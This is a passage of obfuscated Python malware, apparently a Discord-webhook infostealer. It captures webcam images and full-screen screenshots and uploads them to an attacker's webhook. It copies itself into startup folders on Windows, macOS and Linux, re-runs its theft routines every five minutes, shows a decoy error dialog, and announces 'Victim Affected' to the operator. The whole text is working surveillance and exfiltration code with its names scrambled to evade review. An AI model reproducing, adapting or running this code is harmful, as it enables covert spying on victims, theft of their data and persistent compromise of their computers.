            QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture = XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ_file_capture
            status = C4ptur3(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture)
        
        if status == "exit":
            return

        ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH = Embed(title=f"Camera Capture {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:", color=DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN, description=f"```└── 📷 - {XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ_file_capture}```")
        ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH.set_footer(text=VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ, icon_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)

        WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ = SyncWebhook.from_url(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX)
        with open(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture, "rb") as f:
            WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ.send(
                embed=ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH,
                file=File(f, filename=XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ_file_capture),
                username=LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH,
                avatar_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI
            )
            
        if os.path.exists(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture):
            os.remove(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture)
    except Exception as e:
        NSOGKUFJECAHAHGZSSJSSQWJIKNVJHYQGCLUHVTPZWQBGZGOMPOKNROLOZNHXIWC(
            MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, 
            title=f'Camera Capture {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:', 
            description=f"""Unable to make a recording:
            ```{e}```"""
        )

def GOVXOLYTVZTEITFOYAXDPJZSWAAUVYYEPDUZWVXZAIVSZZZWKKGLIHTHKHDCYLLNMZCNKHNWSJTJPYDAVFBEEZTR():
    import io
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    
    try:
        def C4ptur3():
            CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV_bytes = io.BytesIO()
            CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV.save(CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV_bytes, format='PNG')
            CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV_bytes.seek(0)
            return CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV_bytes
        
        CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV_bytes = C4ptur3()

        ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH = Embed(title=f"Screenshot {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:", color=DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN)
        ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH.set_image(url="attachment://screenshot.png")
        ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH.set_footer(text=VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ, icon_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI)
        WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ = SyncWebhook.from_url(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX)
        WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ.send(
            embed=ZPNEOJPUPFBTDDEGUSYPCVAQTWVUKHWTSJIILQNBNCSGVGEJKDDDPIHHGKYTAHYJVGMZSRUFTIZCUKTUVZDGCCXAOTBXBQPEH,
            file=File(CNOLXVIQEQUYSHYSCIYGSOMVCMECBJJHENUDIHCLFUILIKPCABWAGXDGQJVVUJYBSUAQRJMRZTQFJSV_bytes, filename="screenshot.png"),
            username=LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH,
            avatar_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI
        )
    except Exception as e:
        NSOGKUFJECAHAHGZSSJSSQWJIKNVJHYQGCLUHVTPZWQBGZGOMPOKNROLOZNHXIWC(
            MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, 
            title=f'Screenshot {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:', 
            description=f"""**Unable to take a screenshot:**
            ```{e}```"""
        )

def TCWPKYKZEPZRRXHYPYPYXGBAJERRLONIYISPWJKBBCFISBPHVCQQMOJMGSRJHRGKOGBCBKPYRPJJBDM():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("An error occurred", "Download all the required files")

def St4rtup():
    import os
    import sys
    import shutil

    try:
        HCWWMEQOPTPSNZNSDLFUCVUPDDKBLVDBRIEMVAXTWCDZBXZNLETYUUNCQFKJEMJAGUYRGGIEAXQEIVVBHDEDACIRC = os.path.abspath(sys.argv[0])

        if HCWWMEQOPTPSNZNSDLFUCVUPDDKBLVDBRIEMVAXTWCDZBXZNLETYUUNCQFKJEMJAGUYRGGIEAXQEIVVBHDEDACIRC.endswith(".exe"):
            UBJHGETEYPBWOUTAEZOWIKZPNFPNCISWCANEGTLQDSJZPBOHTWTTPKYHMOWTYOFPTWTLDAIMKBWPTIVLFZBJBA = "exe"
        elif HCWWMEQOPTPSNZNSDLFUCVUPDDKBLVDBRIEMVAXTWCDZBXZNLETYUUNCQFKJEMJAGUYRGGIEAXQEIVVBHDEDACIRC.endswith(".py"):
            UBJHGETEYPBWOUTAEZOWIKZPNFPNCISWCANEGTLQDSJZPBOHTWTTPKYHMOWTYOFPTWTLDAIMKBWPTIVLFZBJBA = "py"

        SGJWNEIBUXVXPIZMEQRKMPOJRTHLXFVUUFJTCLPHUWOPNXWKEFCDUHGUISBUDLVWWPTSVTKQJLWEWNMTFRVDSQQJBOXQS = f"ㅤ.{UBJHGETEYPBWOUTAEZOWIKZPNFPNCISWCANEGTLQDSJZPBOHTWTTPKYHMOWTYOFPTWTLDAIMKBWPTIVLFZBJBA}"

        if sys.platform.startswith('win'):  
            LXLZHDVZBJZIHWVERWGASBOVVQNQLWCEFFMCLLADFKMZYLIFUCQAQVGDIDCSRYPIXSBUEOZQIYBGWLKKZMFTJIQIPXXQJHB = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            LXLZHDVZBJZIHWVERWGASBOVVQNQLWCEFFMCLLADFKMZYLIFUCQAQVGDIDCSRYPIXSBUEOZQIYBGWLKKZMFTJIQIPXXQJHB = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            LXLZHDVZBJZIHWVERWGASBOVVQNQLWCEFFMCLLADFKMZYLIFUCQAQVGDIDCSRYPIXSBUEOZQIYBGWLKKZMFTJIQIPXXQJHB = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_new_file = os.path.join(LXLZHDVZBJZIHWVERWGASBOVVQNQLWCEFFMCLLADFKMZYLIFUCQAQVGDIDCSRYPIXSBUEOZQIYBGWLKKZMFTJIQIPXXQJHB, SGJWNEIBUXVXPIZMEQRKMPOJRTHLXFVUUFJTCLPHUWOPNXWKEFCDUHGUISBUDLVWWPTSVTKQJLWEWNMTFRVDSQQJBOXQS)

        shutil.copy(HCWWMEQOPTPSNZNSDLFUCVUPDDKBLVDBRIEMVAXTWCDZBXZNLETYUUNCQFKJEMJAGUYRGGIEAXQEIVVBHDEDACIRC, QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_new_file)
        os.chmod(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_new_file, 0o777) 
    except:
        pass

def R3st4rt():
    while True:
        time.sleep(300)

        requests.post(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, json={'content': f'****╔════════════════════Restart═══════════════════╗****', 'username': LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, 'avatar_url': CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI})
        try: LVDRWMZMEIXKYSSVAGPRQQZKWAGGUGPJNGXQTORRCXAQXKDAKWLRMVQERGTSYRVKRIWBSGPSLIOQLLHDUDPCWPRSTTTT()
        except: pass
        try: JIXMPPDJEZOZSNFGTQAHQFXHKEOXHFOURXLNBQXZZNAHCAPAMUBFGOBIPYUAEOPKQEPXHXVYWHMCRJUASNSH()
        except: pass
        try: UDCUDCXKRSUFLSYROPWADGBHSXKQDVJCLHRXFSRTVYPCEZYIXVKQDUFSFWFUHDKHB()
        except: pass
        try: KCAEDQSOVCGKAGHVMMHMGZZXBMROYAWACJSXTZIVWCAQYEYVIQHVXUSNDNEPYHKJRFYUKGMDQQUVDV()
        except: pass
        try: DZKTFMTFNMJNKOPZPQGYXACWXWLNLGQZJKAHXGCAEBRNIXLRNNLAVMUOFWHQCVMPTDNMZVUCGANFUMHNUI()
        except: pass
        try: BFMLKABPJZDBIAAFITQXFHRBTDIKJUSKPTMACGWMOZLYPNBAXPRSDSGXBSVDUFLDBZLFDGBPLVCPNRKKUFALJPNHOLHVCXWNOV()
        except: pass
        try: GOVXOLYTVZTEITFOYAXDPJZSWAAUVYYEPDUZWVXZAIVSZZZWKKGLIHTHKHDCYLLNMZCNKHNWSJTJPYDAVFBEEZTR()
        except: pass
        requests.post(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, json={'content': f'****╚══════════════════{YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}══════════════════╝****', 'username': LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, 'avatar_url': CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI})

try: requests.post(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, 'avatar_url': CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI,})
except: pass
try: threading.Thread(target=DSWVXJRBOGXZGTNXDUUNEOUAOOMKXMVNHSBSWFGPEVOMRQXOBLZTQNBJXWLJNSWGQPKYP).start()
except: pass
try: threading.Thread(target=EUREHKLOIYVKWOJBQMYDUYRPQNQKDRNQICNCRQKZZZAUGAAIMNINHTPNZWMMBDTATXTBPGLICOUPQAMPPNVGLE).start()
except: pass
try: threading.Thread(target=ZKADPOAXSOXSAZFHYYBRTJJRBSWXSMZNFKFSHYXRYLQSKULGOOKZHUJBUXUQGJNSOMWCWSDIOG).start()
except: pass
try: threading.Thread(target=YGHRXEYYYWFRZXXAABVUWXLNJCUHXPNUDLYITARDWNTGEWXFERJAAJAPYEGHYKXULQRREJNORBWRXIYTLKGPWZEKV).start()
except: pass
try: LVDRWMZMEIXKYSSVAGPRQQZKWAGGUGPJNGXQTORRCXAQXKDAKWLRMVQERGTSYRVKRIWBSGPSLIOQLLHDUDPCWPRSTTTT()
except: pass
try: JIXMPPDJEZOZSNFGTQAHQFXHKEOXHFOURXLNBQXZZNAHCAPAMUBFGOBIPYUAEOPKQEPXHXVYWHMCRJUASNSH()
except: pass
try: UDCUDCXKRSUFLSYROPWADGBHSXKQDVJCLHRXFSRTVYPCEZYIXVKQDUFSFWFUHDKHB()
except: pass
try: KCAEDQSOVCGKAGHVMMHMGZZXBMROYAWACJSXTZIVWCAQYEYVIQHVXUSNDNEPYHKJRFYUKGMDQQUVDV()
except: pass
try: DZKTFMTFNMJNKOPZPQGYXACWXWLNLGQZJKAHXGCAEBRNIXLRNNLAVMUOFWHQCVMPTDNMZVUCGANFUMHNUI()
except: pass
try: BFMLKABPJZDBIAAFITQXFHRBTDIKJUSKPTMACGWMOZLYPNBAXPRSDSGXBSVDUFLDBZLFDGBPLVCPNRKKUFALJPNHOLHVCXWNOV()
except: pass
try: FAECYFNNQXDDNWHGRAJGLKGIUFHLEUUZNFHLGKCKVOGXCUWJEHUSLNRBOPEDGPMNIKQDVVTLW()
except: pass
try: GOVXOLYTVZTEITFOYAXDPJZSWAAUVYYEPDUZWVXZAIVSZZZWKKGLIHTHKHDCYLLNMZCNKHNWSJTJPYDAVFBEEZTR()
except: pass
try: requests.post(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, json={'content': f'****╚══════════════════{YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}══════════════════╝****', 'username': LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, 'avatar_url': CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI})
except: pass
try: threading.Thread(target=HHMKFOOVKAXNCGRSSECUOIDOWKBNIXRLGOEKEZIDYISRNVILWDPRSQOYEYTHYPYXKAXAHILWZMAPMXGKVAOSKHQRURSGJMPFAADY).start()
except: pass
try: threading.Thread(target=XMPNDTMNDILZOOSTSJLIKKHEZVXWJHHIIXXDJZBFTWTFLTQYBMYU).start()
except: pass
try: threading.Thread(target=TCWPKYKZEPZRRXHYPYPYXGBAJERRLONIYISPWJKBBCFISBPHVCQQMOJMGSRJHRGKOGBCBKPYRPJJBDM).start()
except: pass
try: threading.Thread(target=PKELAIJHFMXWGNETIMWEMSRQUDJEZDEKNUYBVQHPIWHDWURBQPTHYNJZMHLKRMIXFGILELCDLWHO).start()
except: pass
